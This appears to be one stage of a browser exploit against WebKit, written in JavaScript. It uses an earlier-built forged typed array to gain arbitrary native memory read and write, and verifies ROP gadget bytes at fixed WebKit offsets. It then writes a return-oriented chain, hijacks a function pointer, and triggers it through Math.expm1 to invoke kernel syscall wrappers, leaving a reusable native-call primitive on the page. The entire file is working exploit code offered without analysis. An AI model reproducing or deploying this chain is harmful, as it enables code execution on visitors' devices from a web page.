// Install a guarded, page-local caller for four byte-checked wrappers.
// Each call uses the existing owned plan and restores every changed byte.
var state = window.__fw14ArrayState;
var plan = window.__fw14NativePlan;
var result;
var phase = "preflight";
try {
  if (!state || !plan || !state.view || !state.array || !state.a ||
      !state.ownedTypedView || !state.calibratedViewBase ||
      state.array[0] !== state.a || !plan.store || !plan.pivot ||
      !plan.stack || !plan.frame || !plan.addresses ||
      !plan.functionSlot || !plan.pivotCell || !plan.pivotObject)
    throw new Error("held_plan_missing");
  var forged = state.view;
  var carrier = state.ownedTypedView;
  var base = state.calibratedViewBase;
  if (carrier.length !== 65536 || carrier[0] !== 0x31 ||
      carrier[7] !== 0xa8 || base % 4096 !== 0)
    throw new Error("carrier_canary_changed");
  function bytesAt(index, count) {
    var out = [];
    for (var n = 0; n < count; n++) out.push(forged[index + n]);
    return out;
  }
  function valueOf(bytes) {
    var value = 0;
    for (var n = bytes.length - 1; n >= 0; n--)
      value = value * 256 + bytes[n];
    return value;
  }
  function pointerBytes(value) {
    if (!Number.isSafeInteger(value) || value < 0 ||
        value >= 0x1000000000000)
      throw new Error("pointer_invalid");
    var out = [];
    for (var n = 0; n < 8; n++)
      out.push(Math.floor(value / Math.pow(2, n * 8)) & 255);
    return out;
  }
  function same(left, right) {
    if (!left || !right || left.length !== right.length) return false;
    for (var n = 0; n < left.length; n++)
      if (left[n] !== right[n]) return false;
    return true;
  }
  function addressOf(object) {
    try {
      state.array[0] = object;
      return valueOf(bytesAt(state.index, 8));
    } finally {
      state.array[0] = state.a;
    }
  }
  var carrierIndex = addressOf(carrier) - base;
  var carrierSlot = carrierIndex + 8;
  if (!Number.isSafeInteger(carrierSlot) || carrierSlot < 0 ||
      carrierSlot + 8 >= 16777216)
    throw new Error("carrier_slot_invalid");
  var carrierOriginal = bytesAt(carrierSlot, 8);
  function readAt(address, count) {
    if (!Number.isSafeInteger(address) || address < 0x100000000 ||
        address >= 0x1000000000000 || count < 1 || count > 192)
      throw new Error("native_read_invalid");
    var next = pointerBytes(address);
    try {
      for (var n = 0; n < 8; n++) forged[carrierSlot + n] = next[n];
      var out = [];
      for (var r = 0; r < count; r++) out.push(carrier[r]);
      return out;
    } finally {
      for (var x = 0; x < 8; x++)
        forged[carrierSlot + x] = carrierOriginal[x];
    }
  }
  function writeAt(address, bytes) {
    if (!Number.isSafeInteger(address) || address < 0x100000000 ||
        address >= 0x1000000000000 || address % 8 !== 0 ||
        !bytes || bytes.length !== 8)
      throw new Error("native_write_invalid");
    var next = pointerBytes(address);
    try {
      for (var n = 0; n < 8; n++) forged[carrierSlot + n] = next[n];
      for (var w = 0; w < 8; w++) carrier[w] = bytes[w];
    } finally {
      for (var x = 0; x < 8; x++)
        forged[carrierSlot + x] = carrierOriginal[x];
    }
  }
  var wrappers = {
    getpid: [plan.target, 0x14],
    kqueue: [plan.target + 0x580, 0x16a],
    kevent: [plan.target - 0x850, 0x16b],
    close: [plan.target + 0xab0, 0x06]
  };
  function wrapperBytes(number) {
    return [0x48,0xc7,0xc0,number & 255,(number >>> 8) & 255,
            0,0,0x49,0x89,0xca,0x0f,0x05,0x72,0x01,0xc3,0x48];
  }
  var gadget = plan.webkitBase + 0x295f948;
  var codeChecks = [
    [gadget,[0x48,0x8b,0x7e,0x30,0x48,0x8b,0x07,0xff,0x10]],
    [plan.webkitBase + 0x5c480,[0x5f,0xc3]],
    [plan.webkitBase + 0x6e45e,[0x5e,0xc3]],
    [plan.webkitBase + 0x12c5ba,[0x5a,0xc3]],
    [plan.webkitBase + 0x1bade,[0x59,0xc3]],
    [plan.webkitBase + 0x9b311,[0x47,0x58,0xc3]],
    [plan.webkitBase + 0x1dcfb1,[0x47,0x59,0xc3]],
    [plan.webkitBase + 0x548b,[0x48,0x89,0x07,0xc3]],
    [plan.webkitBase + 0x10504,[0x58,0xc3]],
    [plan.webkitBase + 0x182f7,[0xc9,0xc3]]
  ];
  phase = "live_bytes";
  for (var ci = 0; ci < codeChecks.length; ci++)
    if (!same(readAt(codeChecks[ci][0],codeChecks[ci][1].length),
              codeChecks[ci][1]))
      throw new Error("gadget_byte_mismatch_" + ci);
  var names = Object.keys(wrappers);
  for (var wi = 0; wi < names.length; wi++) {
    var entry = wrappers[names[wi]];
    if (!same(readAt(entry[0],16),wrapperBytes(entry[1])))
      throw new Error("wrapper_byte_mismatch_" + names[wi]);
  }
  if (!same(readAt(plan.functionSlot,8),plan.originalFunctionSlot) ||
      !same(readAt(plan.addresses.stack + plan.stackOffset,8),
            pointerBytes(plan.target)) ||
      !same(readAt(plan.addresses.store,8),
            Array.from(plan.store.subarray(0,8))) ||
      Math.abs(Math.expm1(1)-1.718281828459045)>1e-12)
    throw new Error("native_plan_changed");
  var scratchOffset = 0x2f80;
  var chainSize = 19 * 8;
  if (scratchOffset < plan.stackOffset + 64 ||
      scratchOffset + chainSize >= plan.stack.length ||
      plan.frame.length < 0x2000)
    throw new Error("scratch_region_invalid");
  var caller = function (name, args) {
    if (!Object.prototype.hasOwnProperty.call(wrappers,name))
      throw new Error("wrapper_not_allowed");
    if (!Array.isArray(args) || args.length > 6)
      throw new Error("args_invalid");
    var values = [];
    for (var ai = 0; ai < 6; ai++) {
      var value = ai < args.length ? args[ai] : 0;
      if (!Number.isSafeInteger(value) || value < 0 ||
          value >= 0x1000000000000)
        throw new Error("arg_invalid_" + ai);
      values.push(value);
    }
    var target = wrappers[name][0];
    if (!same(readAt(target,16),wrapperBytes(wrappers[name][1])) ||
        !same(readAt(plan.functionSlot,8),plan.originalFunctionSlot) ||
        !same(readAt(plan.addresses.store,8),
              Array.from(plan.store.subarray(0,8))) ||
        !same(readAt(plan.addresses.stack + plan.stackOffset,8),
              pointerBytes(plan.target)) ||
        Math.abs(Math.expm1(1)-1.718281828459045)>1e-12)
      throw new Error("call_preflight_changed");
    var functionOriginal = readAt(plan.functionSlot,8);
    var pivotOriginal = readAt(plan.pivotCell,8);
    var pivotStackOriginal = readAt(plan.addresses.pivot+0x38,8);
    var frameOriginal = Array.from(plan.frame.subarray(0,8));
    var chainOriginal = Array.from(plan.stack.subarray(
      scratchOffset,scratchOffset+chainSize));
    if (!same(pivotOriginal.slice(0,7),plan.pivotHeader.slice(0,7)) ||
        pivotOriginal[7] > 2 ||
        !same(pivotStackOriginal,
              pointerBytes(plan.addresses.stack+plan.stackOffset)))
      throw new Error("pivot_preflight_changed");
    var functionTouched=false,pivotTouched=false,stackTouched=false;
    var chainTouched=false,frameTouched=false;
    var output=null,returnTime=0;
    try {
      frameTouched=true;
      plan.frame.fill(0xa5,0,8);
      if (!same(readAt(plan.addresses.frame,8),
                [0xa5,0xa5,0xa5,0xa5,0xa5,0xa5,0xa5,0xa5]))
        throw new Error("result_sentinel_changed");
      var chain=[plan.webkitBase+0x5c480,values[0],
        plan.webkitBase+0x6e45e,values[1],
        plan.webkitBase+0x12c5ba,values[2],
        plan.webkitBase+0x1bade,values[3],
        plan.webkitBase+0x9b311,values[4],
        plan.webkitBase+0x1dcfb1,values[5],
        target,plan.webkitBase+0x5c480,plan.addresses.frame,
        plan.webkitBase+0x548b,plan.webkitBase+0x10504,null,
        plan.webkitBase+0x182f7];
      var stackView=new DataView(plan.stack.buffer);
      chainTouched=true;
      for (var c=0;c<chain.length;c++) {
        if (c===17) {
          stackView.setUint32(scratchOffset+c*8,0x0a,true);
          stackView.setUint32(scratchOffset+c*8+4,0xfffffff7,true);
        } else {
          stackView.setUint32(scratchOffset+c*8,chain[c]>>>0,true);
          stackView.setUint32(scratchOffset+c*8+4,
            Math.floor(chain[c]/0x100000000)>>>0,true);
        }
      }
      stackTouched=true;
      var nextStack=pointerBytes(plan.addresses.stack+scratchOffset);
      for (var s=0;s<8;s++) plan.pivot[0x38+s]=nextStack[s];
      if (!same(readAt(plan.addresses.stack+scratchOffset,chainSize),
                Array.from(plan.stack.subarray(scratchOffset,
                                              scratchOffset+chainSize))) ||
          !same(readAt(plan.addresses.pivot+0x38,8),nextStack))
        throw new Error("chain_readback_failed");
      functionTouched=true;
      writeAt(plan.functionSlot,pointerBytes(gadget));
      pivotTouched=true;
      writeAt(plan.pivotCell,pointerBytes(plan.addresses.store));
      if (!same(readAt(plan.functionSlot,8),pointerBytes(gadget)) ||
          !same(readAt(plan.pivotCell,8),
                pointerBytes(plan.addresses.store)))
        throw new Error("call_arm_failed");
      Math.expm1(plan.pivotObject);
      returnTime=Date.now();
      var frameView=new DataView(plan.frame.buffer);
      output={ value:frameView.getInt32(0,true),
               high:frameView.getUint32(4,true),
               returned_at:returnTime };
    } finally {
      if (functionTouched) writeAt(plan.functionSlot,functionOriginal);
      if (pivotTouched) writeAt(plan.pivotCell,pivotOriginal);
      if (stackTouched)
        for (var ps=0;ps<8;ps++)
          plan.pivot[0x38+ps]=pivotStackOriginal[ps];
      if (chainTouched)
        for (var cs=0;cs<chainSize;cs++)
          plan.stack[scratchOffset+cs]=chainOriginal[cs];
      if (frameTouched)
        for (var fs=0;fs<8;fs++) plan.frame[fs]=frameOriginal[fs];
    }
    if (!same(readAt(plan.functionSlot,8),functionOriginal) ||
        !same(readAt(plan.pivotCell,8),pivotOriginal) ||
        !same(readAt(plan.addresses.pivot+0x38,8),pivotStackOriginal) ||
        !same(readAt(plan.addresses.stack+scratchOffset,chainSize),
              chainOriginal) ||
        !same(readAt(plan.addresses.frame,8),frameOriginal) ||
        !same(bytesAt(carrierSlot,8),carrierOriginal) ||
        carrier[0]!==0x31 || carrier[7]!==0xa8 ||
        state.array[0]!==state.a)
      throw new Error("call_restore_failed");
    return output;
  };
  phase="control_call";
  if (api && typeof api.markSync === "function")
    api.markSync("native_invoke_preflight");
  var control=caller("getpid",[]);
  if (!control || control.value<=0 || control.value>=0x1000000 ||
      control.high!==0)
    throw new Error("control_pid_invalid");
  window.__fw14NativeInvoke={ call:caller, frame:plan.frame,
    frameAddress:plan.addresses.frame,
    wrappers:{ getpid:wrappers.getpid[0],
      kqueue:wrappers.kqueue[0],
      kevent:wrappers.kevent[0],close:wrappers.close[0] },
    sourceSession:"current_page" };
  if (api && typeof api.markSync === "function")
    api.markSync("native_invoke_restored");
  result={id:"native_invoke_install_v1",status:"pass",
    details:{pid:control.value,high:control.high,
      wrappers_checked:4,gadgets_checked:codeChecks.length,
      carrier_restored:same(bytesAt(carrierSlot,8),carrierOriginal)}};
} catch (error) {
  result={id:"native_invoke_install_v1",status:"error",
    details:{phase:phase,error:String(error).slice(0,180)}};
}
return [result];
